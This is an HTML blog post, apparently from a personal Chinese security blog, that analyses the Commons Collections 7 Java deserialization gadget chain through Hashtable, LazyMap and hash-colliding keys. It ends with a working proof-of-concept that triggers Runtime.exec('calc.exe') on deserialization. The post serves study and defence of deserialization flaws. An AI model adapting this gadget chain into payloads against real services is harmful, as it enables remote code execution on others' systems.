@@ -1,0 +1,430 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections7利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections7利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="调用链
+    java.util.Hashtable.readObject
+    java.util.Hashtable.reconstitutionPut
+    org.apache.commons.collections.map...." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections7利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-08
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="调用链">调用链</h2>
+<pre><code>    java.util.Hashtable.readObject
+    java.util.Hashtable.reconstitutionPut
+    org.apache.commons.collections.map.AbstractMapDecorator.equals
+    java.util.AbstractMap.equals
+    org.apache.commons.collections.map.LazyMap.get
+    org.apache.commons.collections.functors.ChainedTransformer.transform
+    org.apache.commons.collections.functors.InvokerTransformer.transform
+    java.lang.reflect.Method.invoke
+    sun.reflect.DelegatingMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke0
+    java.lang.Runtime.exec
+</code></pre>
+<h2 id="差异点分析">差异点分析</h2>
+<p>CC1、3、5、6都用都到了<code>LazyMap</code>的<code>get</code>作为命令执行的入口点，CC7同样采用<code>LazyMap</code>的<code>get()</code>但是有别于之前的触发方法。</p>
+<h3 id="hashtable">Hashtable</h3>
+<p>该条反序列化的入口点是<code>readObject()</code></p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+        // Read in the length, threshold, and loadfactor
+        s.defaultReadObject();
+
+        // Read the original length of the array and number of elements
+        int origlength = s.readInt();
+        int elements = s.readInt();
+
+        // Compute new size with a bit of room 5% to grow but
+        // no larger than the original size.  Make the length
+        // odd if it's large enough, this helps distribute the entries.
+        // Guard against the length ending up zero, that's not valid.
+        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
+        if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)
+            length--;
+        if (origlength &gt; 0 &amp;&amp; length &gt; origlength)
+            length = origlength;
+        table = new Entry&lt;?,?&gt;[length];
+        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+        count = 0;
+
+        // Read the number of elements and then all the key/value objects
+        for (; elements &gt; 0; elements--) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                K key = (K)s.readObject();
+            @SuppressWarnings(&quot;unchecked&quot;)
+                V value = (V)s.readObject();
+            // synch could be eliminated for performance
+            reconstitutionPut(table, key, value);
+        }
+    }
+</code></pre>
+<p>追入<code>reconstitutionPut()</code>中，在里面找到<code>e.key.equals(key)</code>可以直接和<code>LazyMap</code>的<code>equals</code>方法进行对接。</p>
+<pre><code class="language-java">    private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings(&quot;unchecked&quot;)
+            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+        count++;
+    }
+</code></pre>
+<p><code>reconstitutionPut()</code> 会将 <code>HashTable</code> 里的键名<code>(key)</code>互相比较，而传入的key是<code>LazyMap</code>，相当于调用<code>LazyMap#equals()</code>。<br>
+但是<code>LazyMap</code>并没有直接实现<code>equals</code>方法，而是在其父类<code>AbstractMapDecorator</code>中实现的，也就是调用了<code>AbstractMapDecorator#equals()</code></p>
+<pre><code class="language-java">    public boolean equals(Object object) {
+        if (object == this) {
+            return true;
+        }
+        return map.equals(object);
+    }
+</code></pre>
+<p>可以看到该方法返回<code>map.equals(object)</code>的值，而<code>map</code>是在LazyMap的构造函数中被赋值：</p>
+<pre><code class="language-java">    protected LazyMap(Map map, Factory factory) {
+        super(map);
+        if (factory == null) {
+            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
+        }
+        this.factory = FactoryTransformer.getInstance(factory);
+    }
+</code></pre>
+<p>如果传入<code>HashMap</code>，那么<code>map.equals(object)</code>实际上就是调用<code>HashMap的equals</code>方法。</p>
+<p>回到HashMap，其继承了<code>Abstract类</code>，而且二者都实现了Map接口。借用安全客的文章中的继承关系图片<br>
+<img src="https://limpid94.github.io/post-images/1649685077683.png" alt="" loading="lazy"><br>
+该链中需要跟一下equals方法，</p>
+<pre><code class="language-java">    public boolean equals(Object o) {
+        if (o == this)
+            return true;
+
+        if (!(o instanceof Map))
+            return false;
+        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+        if (m.size() != size())
+            return false;
+
+        try {
+            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+            while (i.hasNext()) {
+                Entry&lt;K,V&gt; e = i.next();
+                K key = e.getKey();
+                V value = e.getValue();
+                if (value == null) {
+                    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                        return false;
+                } else {
+                    if (!value.equals(m.get(key)))
+                        return false;
+                }
+            }
+        } catch (ClassCastException unused) {
+            return false;
+        } catch (NullPointerException unused) {
+            return false;
+        }
+
+        return true;
+    }
+</code></pre>
+<p>其中有两处<code>m.get(key)</code>的调用就是触发命令执行的链接点。</p>
+<h3 id="注意点">注意点</h3>
+<p>整条链条看上去并不复杂，但是值得注意的细节比较多。<br>
+首先是需要【两个HashMap】。因为在Hashtable的put方法中：</p>
+<pre><code class="language-java">    public synchronized V put(K key, V value) {
+       ......(部分代码省略)
+        for(; entry != null ; entry = entry.next) {
+            if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
+                V old = entry.value;
+                entry.value = value;
+                return old;
+            }
+        }
+        ......
+</code></pre>
+<p>两个hashmap相同的话会直接在hashtable put的时候认为是一个元素，之后在反序列化的时候不再触发反序列化代码。</p>
+<p>其次是【zZ和yy】。一开始以为是任意的两个字符串，但是经过分析之后发现实际上是有作用的。<br>
+仔细看一下<code>Hashtable#reconstitutionPut</code>的代码</p>
+<pre><code class="language-java">    private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings(&quot;unchecked&quot;)
+            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+        count++;
+    }
+</code></pre>
+<p>其中<code>if ((e.hash == hash) &amp;&amp; e.key.equals(key))</code>要求两个哈希必须相等。此处想到和2022虎符CTF的web题类似，需要从hashCode计算方法入手<br>
+<img src="https://limpid94.github.io/post-images/1649825895114.png" alt="" loading="lazy"><br>
+因此假定比较的第一个字符串为'yy'，其字符的ASCII是121，若第二个字符串开头与之相差1，即z开头，那么z后的字符应该是121-31=90,就是Z。因此要和第一个字符串相等，第二个字符串可以是zZ。（当然，不是只有这两个字符串，只要符合这个规律的字符串都行）<br>
+这里其实还隐含了一个条件，就是这两个字符串不能是相同的。因为lazymap#get()中有这样的逻辑：</p>
+<pre><code class="language-java">        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+</code></pre>
+<p>请注意到containsKey()方法：<br>
+<img src="https://limpid94.github.io/post-images/1649826795369.png" alt="" loading="lazy"></p>
+<p>也就是相同的key会导致其不进入<code>transform()</code>方法。</p>
+<p>再者需要理解 【lazyMap2.remove(&quot;yy&quot;);】。因为<code>hashtable</code>有两次<code>put</code>的操作，在第二次<code>hashtable.put(lazyMap2, 1);</code>时，会触发LazyMap 的 get 方法，会新增一个 key/value 值相同的键值对，所以此时会多出一个yy。<br>
+<img src="https://limpid94.github.io/post-images/1649829997580.png" alt="" loading="lazy"></p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CommonCollections7 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };
+
+        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
+        //LazyMap传入的值需要一个map类型，因此用HashMap
+        HashMap&lt;Object, Object&gt; innerMap1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; innerMap2 = new HashMap&lt;&gt;();
+        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
+        lazyMap1.put(&quot;yy&quot;,1);
+        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
+        lazyMap2.put(&quot;zZ&quot;,1);
+
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1,1);
+        hashtable.put(lazyMap2,1);
+
+        Field iTransformersField = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        iTransformersField.setAccessible(true);
+        iTransformersField.set(chainedTransformer,transformers);
+        lazyMap2.remove(&quot;yy&quot;);
+
+//        mySeriable(hashtable);
+        myDeseriable();
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser7.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser7.bin&quot;));
+        return ois.readObject();
+    }
+}
+</code></pre>
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/240040#h3-4<br>
+https://javamana.com/2022/03/202203132203154936.html<br>
+https://blog.csdn.net/qq_35733751/article/details/119862728<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections7<br>
+http://cnblogs.com/nice0e3/p/13910833.html<br>
+https://blog.csdn.net/weixin_44245828/article/details/109853439</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+<li><a href="#%E5%B7%AE%E5%BC%82%E7%82%B9%E5%88%86%E6%9E%90">差异点分析</a>
+<ul>
+<li><a href="#hashtable">Hashtable</a></li>
+<li><a href="#%E6%B3%A8%E6%84%8F%E7%82%B9">注意点</a></li>
+</ul>
+</li>
+<li><a href="#poc">POC</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections6-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections6利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
